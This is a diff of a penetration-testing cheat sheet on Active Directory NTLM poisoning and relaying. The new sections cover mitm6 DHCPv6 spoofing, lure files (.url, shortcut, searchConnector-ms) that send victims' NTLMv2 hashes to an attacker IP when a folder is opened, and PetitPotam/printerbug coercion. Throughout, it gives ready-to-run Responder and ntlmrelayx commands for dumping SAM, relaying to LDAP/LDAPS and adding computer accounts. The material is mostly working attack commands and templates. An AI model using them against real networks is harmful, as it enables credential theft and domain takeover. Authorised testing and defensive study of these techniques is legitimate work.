@@ -1,10 +1,16 @@
 ## Relaying attacks
-* [SMB relaying](#SMB-relaying)
-* [LDAP Relaying](#LDAP-Relaying)
-  * [LDAP Relay force HTTP requests](#LDAP-Relay-force-HTTP-requests)
-  * [LDAP Relay with Mitm6](#LDAP-Relay-with-Mitm6)
-* [LDAPS Relaying](#LDAPS-Relaying)
-  * [Resource Based Constrained Delegation Webclient Attack](#Resource-Based-Constrained-Delegation-Webclient-Attack)
+* [Poisoning](#Poisoning)
+  * [Responder](#Responder)
+  * [Mitm6](#Mitm6)
+  * [Files](#Files)
+  * [Force-authentication](#Force-authentication)
+* [Relaying](#Relaying)
+  * [SMB relaying](#SMB-relaying)
+  * [LDAP Relaying](#LDAP-Relaying)
+    * [LDAP Relay force HTTP requests](#LDAP-Relay-force-HTTP-requests)
+    * [LDAP Relay with Mitm6](#LDAP-Relay-with-Mitm6)
+  * [LDAPS Relaying](#LDAPS-Relaying)
+    * [Resource Based Constrained Delegation Webclient Attack](#Resource-Based-Constrained-Delegation-Webclient-Attack)
 - https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
 
 ## Poisoning
@@ -24,6 +30,80 @@ sudo responder -I eth0 -A
 sudo responder -I eth0
 ```
 
+### Mitm6
+- https://github.com/dirkjanm/mitm6
+- In modern Windows operating systems, IPv6 is enabled by default. This means that systems periodically poll for an IPv6 lease, as IPv6 is a newer protocol than IPv4, and Microsoft decided it was a good idea to give IPv6 precedence over IPv4.
+- However, in the vast majority of organizations, IPv6 is left unused, which means that an adversary could hijack the DHCP requests for IPv6 addresses and force authentication attempts to the attacker-controlled system. We do that by setting our system as the primary DNS server.
+- Spoof any requests for internal resources
+```
+sudo python3 mitm6.py -d <DOMAIN> --ignore-nofqdn
+```
+
+### Files
+- It is possible to force authentication if a user opens a file location in explorer or files itself.
+- Will authenticate to our attacking machine as the user
+- Tools that can create these files:
+  - https://github.com/mdsecactivebreach/Farmer - Windows
+  - https://github.com/Greenwolf/ntlm_theft - Python
+
+#### Link file
+- Explorer automaticly connects if folder where the SearchConnector is, is opened.
+- On Windows right click --> New --> Shortcut --> and in the URL use
+- Creates a ```[SMB] NTLMv2-SSP Hash``` in responder, ```[*] SMBD-Thread-4:``` in ntlmrelayx. Can be used against relaying to SMB.
+```
+file://<IP>/test
+```
+
+#### URL file
+- Explorer automaticly connects if folder where the SearchConnector is, is opened.
+- Filename ```something.url```
+- Creates a ```[SMB] NTLMv2-SSP Hash``` in responder, ```[*] SMBD-Thread-x:``` in ntlmrelayx. Can be used against relaying to SMB.
+```
+[InternetShortcut]
+URL=whatever
+WorkingDirectory=whatever
+IconFile=\\<IP>\%USERNAME%.icon
+IconIndex=1
+```
+
+#### SearchConnector
+- Explorer automaticly connects if folder where the SearchConnector is, is opened.
+- Actives the Windows Webclient service which can be used to authenticate a host again to the attacking IP with petitpotam. See #REFERENCE
+- Creates a ```[WebDAV] NTLMv2 Hash``` in responder, ```HTTPD: received``` in ntlmrelayx. Can be used against relaying to ldap, ldaps and SMB
+- https://www.bussink.net/webclient_activation/
+- Filename ```Documents.searchConnector-ms```
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
+    <iconReference>imageres.dll,-1002</iconReference>
+    <description>Microsoft Outlook</description>
+    <isSearchOnlyItem>false</isSearchOnlyItem>
+    <includeInStartMenuScope>true</includeInStartMenuScope>
+    <iconReference>//<ATTACKER IP>@80/test.ico</iconReference>
+    <templateInfo>
+        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
+    </templateInfo>
+    <simpleLocation>
+        <url>//<ATTACKER IP>@80/test</url>
+    </simpleLocation>
+</searchConnectorDescription>
+```
+
+- For other filetypes check out the tools listed
+
+### Force authentication
+#### Trigger target computer to authenticate to attacker machine
+- https://github.com/topotam/PetitPotam
+- https://github.com/dirkjanm/krbrelayx
+- Creates a ```[WebDAV] NTLMv2 Hash``` in responder, ```HTTPD: received``` in ntlmrelayx. Can be used against relaying to ldap, ldaps.
+- Will authenticate to our attacking machine as the computer account. Can be used for RBCD.
+```
+python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@80/a <TARGET>
+
+python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@80/a
+```
+
+## Relaying
 ### SMB relaying
 - Requirement: Only possible to hosts without SMB Signing
 
@@ -32,26 +112,18 @@ sudo responder -I eth0
 crackmapexec smb <IP RANGE> --gen-relay-list smb_hosts_nosigning.txt
 ```
 
-#### Poison Requests
-- Poison Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS) requests.
-```
-Responder -I eth0
-```
-
 #### Relay requests SMB and dump SAM
 - we have to modify the Responder.conf file and disable the HTTP and SMB servers (as NTLM relay will be our SMB and HTTP server).
 - the ```-d``` flag has now been changed from “Enable answers for NETBIOS domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False” to “Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False”. It should also be noted that ```-d``` as it is now CAN have an impact on your client’s network, as you are effectively poisoning the WPAD file over DHCP, which does not always revert back immediately once you stop the attack. It will likely require a reboot.
 ```
-Responder -I eth0
-ntlmrelayx.py -tf smb_hosts_nosigning.txt 
+ntlmrelayx.py -tf smb_hosts_nosigning.txt -smb2support
 ```
 
 #### Relay requests SMB and keep SMB sessions open
 - Use the ```socks``` option to be able to use the ```socks``` command to get a nice overview of the relayed attempts. It will also keep the SMB connection open indefinitely. 
 
 ```
-Responder -I eth0
-ntlmrelayx.py -tf smb_hosts_nosigning.txt --socks
+ntlmrelayx.py -tf smb_hosts_nosigning.txt --socks -smb2support
 
 # Get overview of all relay attempts
 ntlmrelayx> socks
@@ -68,8 +140,8 @@ proxychains python3 smbclient.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>
 ```
 
 ### LDAP Relaying
-### LDAP Relay force HTTP requests
-- Requires HTTP requests, because SMB signing is enabled by default.
+### LDAP Relay force HTTP/WEBDAV requests
+- Requires HTTP/WEBDAV requests, because SMB signing is enabled by default.
 
 #### Scan for target with webclient active
 - https://github.com/Hackndo/WebclientServiceScanner
@@ -99,8 +171,7 @@ webclientservicescanner <DOMAIN>/<USER>:<PASSWORD>@<IP RANGE> -dc-ip <DC IP>
 
 #### Enable the LDAP relay
 ```
-Responder -I eth0
-ntlmrelayx.py -t ldap://<DC IP> -smb2support
+ntlmrelayx.py -t ldap://<DC IP> 
 ```
 
 #### Trigger target to authenticate to attacker machine
@@ -115,13 +186,9 @@ python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@80/a
 - However, since printerbug and PetitPotam both needed authentication to work, we could have just used a tool like ldapdomaindump to directly bind to LDAP ourselves and dump the data directly. To do this unauthenticated use mitm6!
 
 ### LDAP Relay with Mitm6
-- In modern Windows operating systems, IPv6 is enabled by default. This means that systems periodically poll for an IPv6 lease, as IPv6 is a newer protocol than IPv4, and Microsoft decided it was a good idea to give IPv6 precedence over IPv4.
-- However, in the vast majority of organizations, IPv6 is left unused, which means that an adversary could hijack the DHCP requests for IPv6 addresses and force authentication attempts to the attacker-controlled system. We do that by setting our system as the primary DNS server.
-- Spoof any requests for internal resources
-
 ```
 sudo python3 mitm6.py -d <DOMAIN> --ignore-nofqdn
-ntlmrelayx.py -t ldap://<DC IP> -wh <DOMAIN> -6
+ntlmrelayx.py -t ldap://<DC IP> -wh <DOMAIN> -6 
 ```
 
 ### LDAPS Relaying
@@ -133,7 +200,7 @@ ntlmrelayx.py -t ldap://<DC IP> -wh <DOMAIN> -6
 ```
 sudo python3 mitm6.py -d <DOMAIN> --ignore-nofqdn
 
-ntlmrelayx.py -t ldaps://<DC IP> --add-computer <COMPUTER NAME>
+ntlmrelayx.py -t ldaps://<DC IP> --add-computer <COMPUTER NAME> 
 ```
 
 #### Trigger target to authenticate to attacker machine
